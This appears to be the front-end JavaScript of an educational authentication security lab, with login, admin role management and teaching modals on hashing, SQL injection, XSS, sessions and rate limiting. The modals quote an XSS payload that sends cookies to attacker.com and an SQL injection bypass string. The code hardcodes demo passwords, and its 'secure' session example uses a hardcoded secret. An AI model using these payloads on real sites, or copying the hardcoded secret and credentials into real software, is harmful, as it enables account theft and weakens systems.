/**
 * Secure Authentication System - Client App Controller
 * Handles Navigation, Authentication AJAX, Password Strength, Dashboard, Admin Panel, and Learning Modals
 */

document.addEventListener('DOMContentLoaded', () => {
  initApp();
});

let currentUser = null;

function initApp() {
  setupNavigation();
  setupAuthForms();
  setupPasswordStrengthMeter();
  setupModalEvents();
  checkAuthState();
}

/* ================= NAVIGATION & TAB CONTROLLER ================= */

function setupNavigation() {
  const navButtons = document.querySelectorAll('.nav-btn');
  navButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const tabId = btn.getAttribute('data-tab');
      switchTab(tabId);
    });
  });
}

function switchTab(tabId) {
  // Update nav buttons
  document.querySelectorAll('.nav-btn').forEach(btn => {
    if (btn.getAttribute('data-tab') === tabId) {
      btn.classList.add('active');
    } else {
      btn.classList.remove('active');
    }
  });

  // Update tab panels
  document.querySelectorAll('.tab-panel').forEach(panel => {
    if (panel.id === tabId) {
      panel.classList.add('active');
    } else {
      panel.classList.remove('active');
    }
  });

  // Trigger tab specific data loading
  if (tabId === 'dashboard-tab') {
    loadUserDashboard();
  } else if (tabId === 'admin-tab') {
    loadAdminPanel();
  }
}

/* ================= AUTHENTICATION AJAX CONTROLLER ================= */

function checkAuthState() {
  fetch('/api/auth/me')
    .then(res => res.json())
    .then(data => {
      if (data.authenticated && data.user) {
        setLoggedInState(data.user);
      } else {
        setLoggedOutState();
      }
    })
    .catch(err => {
      console.error('Error checking auth state:', err);
      setLoggedOutState();
    });
}

function setLoggedInState(user) {
  currentUser = user;
  const statusIndicator = document.getElementById('status-indicator');
  const statusText = document.getElementById('user-status-text');
  const logoutBtn = document.getElementById('btn-logout');

  statusIndicator.className = 'status-indicator online';
  statusText.innerHTML = `Signed in as <strong>${escapeHTML(user.username)}</strong> (${user.role.toUpperCase()})`;
  logoutBtn.classList.remove('hidden');

  logoutBtn.onclick = handleLogout;
}

function setLoggedOutState() {
  currentUser = null;
  const statusIndicator = document.getElementById('status-indicator');
  const statusText = document.getElementById('user-status-text');
  const logoutBtn = document.getElementById('btn-logout');

  statusIndicator.className = 'status-indicator offline';
  statusText.textContent = 'Not Authenticated';
  logoutBtn.classList.add('hidden');
}

function setupAuthForms() {
  // Toggle between Login & Register forms
  const toggleLogin = document.getElementById('toggle-login');
  const toggleRegister = document.getElementById('toggle-register');
  const formLogin = document.getElementById('form-login');
  const formRegister = document.getElementById('form-register');

  toggleLogin.addEventListener('click', () => {
    toggleLogin.classList.add('active');
    toggleRegister.classList.remove('active');
    formLogin.classList.remove('hidden');
    formRegister.classList.add('hidden');
  });

  toggleRegister.addEventListener('click', () => {
    toggleRegister.classList.add('active');
    toggleLogin.classList.remove('active');
    formRegister.classList.remove('hidden');
    formLogin.classList.add('hidden');
  });

  // Handle Login Submit
  formLogin.addEventListener('submit', (e) => {
    e.preventDefault();
    const email = document.getElementById('login-email').value;
    const password = document.getElementById('login-password').value;

    fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
    })
      .then(res => res.json().then(data => ({ status: res.status, data })))
      .then(({ status, data }) => {
        if (status === 200) {
          showToast('Success', 'Login successful! Welcome back.', 'success');
          setLoggedInState(data.user);
          switchTab('dashboard-tab');
        } else if (status === 429) {
          showToast('Rate Limited', data.message, 'error');
        } else {
          showToast('Login Failed', data.message || 'Invalid credentials.', 'error');
        }
      })
      .catch(err => {
        showToast('Error', 'Network error during login attempt.', 'error');
      });
  });

  // Handle Register Submit
  formRegister.addEventListener('submit', (e) => {
    e.preventDefault();
    const username = document.getElementById('reg-username').value;
    const email = document.getElementById('reg-email').value;
    const password = document.getElementById('reg-password').value;

    fetch('/api/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, email, password }),
    })
      .then(res => res.json().then(data => ({ status: res.status, data })))
      .then(({ status, data }) => {
        if (status === 201) {
          showToast('Account Created', 'Registration successful! Logged in automatically.', 'success');
          setLoggedInState(data.user);
          switchTab('dashboard-tab');
        } else if (status === 400 && data.errors) {
          const firstErr = data.errors[0].message;
          showToast('Validation Error', firstErr, 'error');
        } else if (status === 429) {
          showToast('Rate Limited', data.message, 'error');
        } else {
          showToast('Registration Error', data.message || 'Could not create account.', 'error');
        }
      })
      .catch(err => {
        showToast('Error', 'Network error during registration.', 'error');
      });
  });

  // Quick Demo Auto-fill buttons
  document.getElementById('btn-demo-user').addEventListener('click', () => {
    document.getElementById('login-email').value = 'user@example.com';
    document.getElementById('login-password').value = 'User123!@#';
    showToast('Demo Credentials Filled', 'Standard User: user@example.com / User123!@#', 'info');
  });

  document.getElementById('btn-demo-admin').addEventListener('click', () => {
    document.getElementById('login-email').value = 'admin@example.com';
    document.getElementById('login-password').value = 'Admin123!@#';
    showToast('Demo Credentials Filled', 'Admin User: admin@example.com / Admin123!@#', 'info');
  });
}

function handleLogout() {
  fetch('/api/auth/logout', { method: 'POST' })
    .then(res => res.json())
    .then(data => {
      showToast('Logged Out', 'Session terminated successfully.', 'info');
      setLoggedOutState();
      switchTab('auth-tab');
    })
    .catch(err => {
      showToast('Error', 'Failed to log out.', 'error');
    });
}

/* ================= REAL-TIME PASSWORD STRENGTH METER ================= */

function setupPasswordStrengthMeter() {
  const regPassword = document.getElementById('reg-password');
  const strengthBar = document.getElementById('strength-bar');
  const strengthText = document.getElementById('strength-text');

  const reqLength = document.getElementById('req-length');
  const reqUpper = document.getElementById('req-uppercase');
  const reqLower = document.getElementById('req-lowercase');
  const reqDigit = document.getElementById('req-digit');
  const reqSpecial = document.getElementById('req-special');

  regPassword.addEventListener('input', () => {
    const val = regPassword.value;
    let score = 0;

    const hasLength = val.length >= 8;
    const hasUpper = /[A-Z]/.test(val);
    const hasLower = /[a-z]/.test(val);
    const hasDigit = /\d/.test(val);
    const hasSpecial = /[@$!%*?&]/.test(val);

    // Update checklist UI
    updateReq(reqLength, hasLength, 'Min 8 characters');
    updateReq(reqUpper, hasUpper, 'At least 1 uppercase letter (A-Z)');
    updateReq(reqLower, hasLower, 'At least 1 lowercase letter (a-z)');
    updateReq(reqDigit, hasDigit, 'At least 1 number (0-9)');
    updateReq(reqSpecial, hasSpecial, 'At least 1 special character (@$!%*?&)');

    if (hasLength) score++;
    if (hasUpper && hasLower) score++;
    if (hasDigit) score++;
    if (hasSpecial) score++;

    // Update Strength Bar & Label
    if (val.length === 0) {
      strengthBar.className = 'strength-bar';
      strengthText.textContent = 'Password Strength: Empty';
    } else if (score <= 1) {
      strengthBar.className = 'strength-bar weak';
      strengthText.textContent = 'Password Strength: Weak (Insecure)';
    } else if (score === 2) {
      strengthBar.className = 'strength-bar medium';
      strengthText.textContent = 'Password Strength: Medium';
    } else if (score === 3) {
      strengthBar.className = 'strength-bar strong';
      strengthText.textContent = 'Password Strength: Strong';
    } else {
      strengthBar.className = 'strength-bar ultra';
      strengthText.textContent = 'Password Strength: Excellent / High Entropy';
    }
  });
}

function updateReq(el, isValid, text) {
  if (isValid) {
    el.className = 'valid';
    el.textContent = '✔ ' + text;
  } else {
    el.className = '';
    el.textContent = '✖ ' + text;
  }
}

/* ================= DYNAMIC DASHBOARD DATA LOADING ================= */

function loadUserDashboard() {
  const container = document.getElementById('user-dashboard-content');

  fetch('/api/user/dashboard')
    .then(res => res.json().then(data => ({ status: res.status, data })))
    .then(({ status, data }) => {
      if (status === 401) {
        container.innerHTML = `
          <div class="card glass-card placeholder-card">
            <h2>🔒 Access Denied (HTTP 401 Unauthorized)</h2>
            <p>You must be logged in with a valid session to access the protected user dashboard.</p>
            <button class="btn btn-primary" onclick="switchTab('auth-tab')">Go to Login</button>
          </div>
        `;
        return;
      }

      const { sessionInfo, recentActivity } = data;

      let activityRows = recentActivity.map(act => `
        <tr>
          <td><code>${escapeHTML(act.action)}</code></td>
          <td><span class="badge ${act.status === 'SUCCESS' ? 'badge-success' : 'badge-failed'}">${act.status}</span></td>
          <td><code>${escapeHTML(act.ip_address)}</code></td>
          <td>${new Date(act.timestamp).toLocaleString()}</td>
        </tr>
      `).join('');

      container.innerHTML = `
        <div class="dashboard-grid">
          
          <!-- User Profile Details Card -->
          <div class="card glass-card profile-card">
            <h2>👤 User Account & Profile</h2>
            <div class="profile-detail">
              <span class="label">User ID:</span>
              <span class="value">#${sessionInfo.userId}</span>
            </div>
            <div class="profile-detail">
              <span class="label">Username:</span>
              <span class="value">${escapeHTML(sessionInfo.username)}</span>
            </div>
            <div class="profile-detail">
              <span class="label">Assigned Role:</span>
              <span class="value"><span class="badge ${sessionInfo.role === 'admin' ? 'badge-admin' : 'badge-user'}">${sessionInfo.role.toUpperCase()}</span></span>
            </div>
          </div>

          <!-- Session Security Inspection Card -->
          <div class="card glass-card profile-card">
            <h2>🍪 Live Session Security Inspector</h2>
            <div class="profile-detail">
              <span class="label">Session ID Token:</span>
              <span class="value"><code>${sessionInfo.sessionID.substring(0, 16)}...</code></span>
            </div>
            <div class="profile-detail">
              <span class="label">Cookie HttpOnly Flag:</span>
              <span class="value"><span class="badge badge-success">TRUE (JS-Inaccessible)</span></span>
            </div>
            <div class="profile-detail">
              <span class="label">SameSite Protection:</span>
              <span class="value"><span class="badge badge-user">LAX (CSRF Guard)</span></span>
            </div>
            <div class="profile-detail">
              <span class="label">Cookie Expiration:</span>
              <span class="value">${new Date(sessionInfo.cookieExpires).toLocaleString()}</span>
            </div>
          </div>

        </div>

        <!-- Personal Security Audit Trail Table -->
        <div class="card glass-card">
          <h3>📜 Personal Security Audit Trail</h3>
          <p class="form-hint" style="margin-bottom:12px">Log of recent authentication events recorded in SQL database for your user ID.</p>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Action Event</th>
                  <th>Status</th>
                  <th>IP Address</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                ${activityRows.length ? activityRows : '<tr><td colspan="4">No recent activity recorded.</td></tr>'}
              </tbody>
            </table>
          </div>
        </div>
      `;
    })
    .catch(err => {
      console.error(err);
    });
}

/* ================= DYNAMIC ADMIN PANEL LOADING (RBAC) ================= */

function loadAdminPanel() {
  const container = document.getElementById('admin-panel-content');

  fetch('/api/admin/users')
    .then(res => res.json().then(data => ({ status: res.status, data })))
    .then(({ status, data }) => {
      if (status === 401) {
        container.innerHTML = `
          <div class="card glass-card placeholder-card">
            <h2>🔒 Access Denied (HTTP 401 Unauthorized)</h2>
            <p>You must be logged in to view the Admin Control Panel.</p>
            <button class="btn btn-primary" onclick="switchTab('auth-tab')">Go to Login</button>
          </div>
        `;
        return;
      }

      if (status === 403) {
        container.innerHTML = `
          <div class="card glass-card placeholder-card">
            <h2>🛡️ RBAC Authorization Blocked (HTTP 403 Forbidden)</h2>
            <p>Access Denied: Your active role <strong>'${currentUser ? currentUser.role : 'user'}'</strong> does not possess Admin privileges.</p>
            <p class="form-hint">This demonstrates server-side RBAC enforcement using middleware.</p>
            <button class="btn btn-secondary" style="margin-top:14px" onclick="switchTab('auth-tab')">Login as Admin</button>
          </div>
        `;
        return;
      }

      // Fetch Audit Logs for Admin
      fetch('/api/admin/logs')
        .then(resLogs => resLogs.json())
        .then(logsData => {
          renderAdminPanelUI(container, data.users, logsData.logs || []);
        });
    })
    .catch(err => {
      console.error(err);
    });
}

function renderAdminPanelUI(container, users, logs) {
  let userRows = users.map(u => `
    <tr>
      <td>#${u.id}</td>
      <td><strong>${escapeHTML(u.username)}</strong></td>
      <td>${escapeHTML(u.email)}</td>
      <td><span class="badge ${u.role === 'admin' ? 'badge-admin' : 'badge-user'}">${u.role.toUpperCase()}</span></td>
      <td>${new Date(u.created_at).toLocaleDateString()}</td>
      <td>
        <button class="btn btn-secondary btn-sm" onclick="toggleUserRole(${u.id}, '${u.role === 'admin' ? 'user' : 'admin'}')">
          ${u.role === 'admin' ? 'Demote to User' : 'Promote to Admin'}
        </button>
      </td>
    </tr>
  `).join('');

  let logRows = logs.map(l => `
    <tr>
      <td>#${l.id}</td>
      <td>${l.user_id ? '#' + l.user_id : 'N/A'} (${escapeHTML(l.username || 'Anon')})</td>
      <td><code>${escapeHTML(l.action)}</code></td>
      <td><span class="badge ${l.status === 'SUCCESS' ? 'badge-success' : 'badge-failed'}">${l.status}</span></td>
      <td><code>${escapeHTML(l.ip_address)}</code></td>
      <td>${new Date(l.timestamp).toLocaleString()}</td>
    </tr>
  `).join('');

  container.innerHTML = `
    <div class="admin-grid" style="display:flex; flex-direction:column; gap:24px;">
      
      <!-- System Directory Table Card -->
      <div class="card glass-card">
        <h2>⚡ User Directory & Privilege Management</h2>
        <p class="form-hint" style="margin-bottom:14px">Manage system accounts and update Role-Based Access Control (RBAC) levels.</p>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>ID</th>
                <th>Username</th>
                <th>Email</th>
                <th>Role</th>
                <th>Created</th>
                <th>RBAC Action</th>
              </tr>
            </thead>
            <tbody>
              ${userRows}
            </tbody>
          </table>
        </div>
      </div>

      <!-- System Security Audit Logs Card -->
      <div class="card glass-card">
        <h2>🛡️ Global System Security Audit Trail</h2>
        <p class="form-hint" style="margin-bottom:14px">Real-time log of security events, authentication attempts, failed logins, and unauthorized access attempts.</p>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>Log ID</th>
                <th>User</th>
                <th>Event Action</th>
                <th>Status</th>
                <th>IP Address</th>
                <th>Timestamp</th>
              </tr>
            </thead>
            <tbody>
              ${logRows}
            </tbody>
          </table>
        </div>
      </div>

    </div>
  `;
}

function toggleUserRole(userId, newRole) {
  fetch('/api/admin/change-role', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ targetUserId: userId, newRole }),
  })
    .then(res => res.json().then(data => ({ status: res.status, data })))
    .then(({ status, data }) => {
      if (status === 200) {
        showToast('Role Updated', data.message, 'success');
        loadAdminPanel(); // Refresh view
      } else {
        showToast('Role Update Failed', data.message || 'Permission denied.', 'error');
      }
    })
    .catch(err => {
      showToast('Error', 'Network error changing user role.', 'error');
    });
}

/* ================= SECURITY LEARNING CENTER MODALS ================= */

function setupModalEvents() {
  const overlay = document.getElementById('modal-overlay');
  const closeBtn = document.getElementById('modal-close');

  closeBtn.addEventListener('click', closeModal);
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) closeModal();
  });
}

function closeModal() {
  document.getElementById('modal-overlay').classList.add('hidden');
}

function openConceptModal(conceptKey) {
  const modalBody = document.getElementById('modal-body');
  const overlay = document.getElementById('modal-overlay');

  const conceptData = {
    hashing: {
      title: '🔑 Cryptographic Storage: Password Salting & Hashing',
      content: `
        <div class="modal-content">
          <h2>Password Salting & Hashing</h2>
          <p><strong>The Threat: Plaintext & MD5 Storage Vulnerabilities</strong></p>
          <p>If a database containing plaintext passwords or fast fast-hashes (like MD5/SHA256) is leaked, attackers can instantly look up pre-computed hashes using <em>Rainbow Tables</em> or execute billions of hash comparisons per second on modern GPUs.</p>
          
          <h3>How Salting and Bcrypt Work</h3>
          <p><strong>1. Unique Salt:</strong> A random cryptographic string is generated for every user before hashing. This ensures two users with the password <code>"Password123"</code> produce entirely different hashes.</p>
          <p><strong>2. Cost Factor (Work Factor):</strong> Bcrypt implements an adaptive key derivation function. In our system, we use <code>saltRounds = 12</code>, which means the algorithm performs 2<sup>12</sup> (4,096) iterations. This intentionally slows down hash computation, rendering brute-force cracking mathematically infeasible.</p>
          
          <h3>Vulnerable vs Secure Code Comparison</h3>
          
          <p>❌ <strong>Vulnerable Code (Plaintext Storage):</strong></p>
          <div class="code-box vulnerable">
// BAD: Storing plaintext password directly in SQL database
db.run("INSERT INTO users (username, password) VALUES (?, ?)", [username, password]);
          </div>

          <p>✅ <strong>Secure Implementation (Bcrypt Hashing in node.js):</strong></p>
          <div class="code-box secure">
const bcrypt = require('bcryptjs');
const saltRounds = 12;

// Hash raw password with random salt before writing to SQL
const passwordHash = await bcrypt.hash(password, saltRounds);
db.run("INSERT INTO users (username, email, password_hash) VALUES (?, ?, ?)", 
  [username, email, passwordHash]);
          </div>
        </div>
      `
    },
    sqli: {
      title: '💉 SQL Injection (SQLi) Defense via Parameterized Queries',
      content: `
        <div class="modal-content">
          <h2>SQL Injection (SQLi) Prevention</h2>
          <p><strong>The Threat: Malicious SQL Code Injection</strong></p>
          <p>SQL Injection occurs when user input is directly concatenated into SQL query strings. An attacker entering <code>admin' OR '1'='1</code> can alter the structure of the SQL statement to bypass authentication without knowing the password.</p>
          
          <h3>How Prepared Statements (Parameterized Queries) Work</h3>
          <p>Parameterized queries send the SQL template (structure) and the user data to the database engine separately. The database compiler treats user input strictly as literal scalar values, never executable code—completely immunizing the application against SQLi.</p>

          <h3>Vulnerable vs Secure Code Comparison</h3>

          <p>❌ <strong>Vulnerable Code (String Concatenation):</strong></p>
          <div class="code-box vulnerable">
// DANGEROUS: Input concatenated directly into query string
const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";
db.get(query, (err, user) => { ... });
// Payload: "user@example.com' OR '1'='1" evaluates to TRUE for all rows!
          </div>

          <p>✅ <strong>Secure Implementation (Parameterized SQL Query in SQLite3):</strong></p>
          <div class="code-box secure">
// SECURE: Placeholders (?) separate SQL syntax from user data
const query = "SELECT * FROM users WHERE email = ?";
db.get(query, [req.body.email], (err, user) => { ... });
          </div>
        </div>
      `
    },
    xss: {
      title: '🧪 Cross-Site Scripting (XSS) & Input Validation',
      content: `
        <div class="modal-content">
          <h2>Cross-Site Scripting (XSS) & Input Sanitization</h2>
          <p><strong>The Threat: Executing Unstrusted Scripts in User Browsers</strong></p>
          <p>XSS attacks occur when an application includes untrusted user data in web pages without proper validation or escaping. If an attacker inputs <code>&lt;script&gt;fetch('http://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</code> into a profile field, other users viewing the profile execute the script automatically.</p>

          <h3>Defenses Implemented in This Lab</h3>
          <p><strong>1. Server-Side Input Sanitization:</strong> Using <code>express-validator</code>'s <code>.escape()</code> method to convert HTML special characters (e.g., <code>&lt;</code> to <code>&amp;lt;</code>).</p>
          <p><strong>2. Content Security Policy (CSP):</strong> Configured via <code>helmet</code> headers to restrict executable script sources to <code>'self'</code>.</p>

          <h3>Vulnerable vs Secure Code Comparison</h3>

          <p>❌ <strong>Vulnerable Code (Raw Output to DOM):</strong></p>
          <div class="code-box vulnerable">
// DANGEROUS: Injecting unescaped user content directly into HTML
element.innerHTML = "Welcome " + user.username;
          </div>

          <p>✅ <strong>Secure Implementation (Escaped HTML Output):</strong></p>
          <div class="code-box secure">
function escapeHTML(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
element.innerHTML = "Welcome " + escapeHTML(user.username);
          </div>
        </div>
      `
    },
    session: {
      title: '🍪 Session Fixation & Cookie Security Flags',
      content: `
        <div class="modal-content">
          <h2>Session Management & Fixation Protection</h2>
          <p><strong>The Threat: Session Hijacking & Session Fixation</strong></p>
          <p>Session Fixation occurs when an attacker tricks a user into authenticating with a pre-set Session ID. If the server does not issue a new Session ID upon login, the attacker uses the known Session ID to hijack the authenticated session.</p>

          <h3>Cookie Security Flags</h3>
          <p><strong>1. HttpOnly:</strong> Instructs browsers that the cookie cannot be accessed via <code>document.cookie</code> JavaScript API, neutralizing session theft via XSS.</p>
          <p><strong>2. SameSite=Lax:</strong> Restricts cookie transmission on cross-site requests, mitigating Cross-Site Request Forgery (CSRF).</p>
          <p><strong>3. Session Regeneration:</strong> Calling <code>req.session.regenerate()</code> upon successful login assigns a new random session key.</p>

          <h3>Secure Express-Session Configuration</h3>
          <div class="code-box secure">
app.use(session({
  store: new SQLiteStore({ db: 'database.sqlite' }),
  secret: 'super_secret_key',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,  // Defense against XSS cookie theft
    sameSite: 'lax',  // Defense against CSRF
    maxAge: 86400000 // 24 Hours
  }
}));

// On Login Success: Regenerate session ID
req.session.regenerate(() => {
  req.session.userId = user.id;
});
          </div>
        </div>
      `
    },
    rbac: {
      title: '🛡️ Role-Based Access Control (RBAC) & Authorization',
      content: `
        <div class="modal-content">
          <h2>Role-Based Access Control (RBAC)</h2>
          <p><strong>The Threat: Broken Access Control (OWASP Top 10 #1)</strong></p>
          <p>Relying solely on frontend UI hiding (e.g. hiding the "Admin" menu button) is insecure because attackers can directly send HTTP API requests to endpoints like <code>/api/admin/users</code> using tools like Postman or cURL.</p>

          <h3>Principle of Least Privilege & Server-Side Middlewares</h3>
          <p>Every incoming request to a protected endpoint must be intercepted by server-side authorization middleware checking <code>req.session.role</code> before fulfilling data.</p>

          <h3>Server-Side RBAC Middleware Code</h3>
          <div class="code-box secure">
function hasRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.session || !allowedRoles.includes(req.session.role)) {
      return res.status(403).json({
        status: 403,
        error: 'Forbidden',
        message: 'Access Denied: Insufficient Role Privilege'
      });
    }
    next();
  };
}

// Protected Route Mount
router.get('/admin/users', isAuthenticated, hasRole('admin'), (req, res) => { ... });
          </div>
        </div>
      `
    },
    ratelimit: {
      title: '⏱️ Rate Limiting & Anti-Brute-Force Protection',
      content: `
        <div class="modal-content">
          <h2>Rate Limiting & Anti-Brute-Force</h2>
          <p><strong>The Threat: Automated Credential Stuffing & Dictionary Attacks</strong></p>
          <p>Attackers use botnets to submit millions of common username/password combinations to login endpoints. Without rate limits, a weak password can be cracked within minutes.</p>

          <h3>How Rate Limiting Works</h3>
          <p>The server tracks request counts per IP address within a rolling time window (e.g., 15 minutes). If the threshold (5 login attempts) is exceeded, Express returns an HTTP <code>429 Too Many Requests</code> response, throttling further attempts.</p>

          <h3>Express-Rate-Limit Code</h3>
          <div class="code-box secure">
const rateLimit = require('express-rate-limit');

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 Minute Window
  max: 5, // Limit 5 login attempts per IP
  message: {
    status: 429,
    error: 'Too Many Requests',
    message: 'Too many authentication attempts. Please try again after 15 minutes.'
  }
});

router.post('/login', authLimiter, (req, res) => { ... });
          </div>
        </div>
      `
    }
  };

  if (conceptData[conceptKey]) {
    modalBody.innerHTML = conceptData[conceptKey].content;
    overlay.classList.remove('hidden');
  }
}

/* ================= TOAST NOTIFICATION UTILITY ================= */

function showToast(title, message, type = 'info') {
  const container = document.getElementById('toast-container');
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;

  const icon = type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️';

  toast.innerHTML = `
    <span style="font-size:18px">${icon}</span>
    <div>
      <strong style="display:block; margin-bottom:2px">${escapeHTML(title)}</strong>
      <span style="color:var(--text-secondary)">${escapeHTML(message)}</span>
    </div>
  `;

  container.appendChild(toast);

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(100%)';
    toast.style.transition = 'all 0.3s ease-out';
    setTimeout(() => toast.remove(), 300);
  }, 4000);
}

function escapeHTML(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
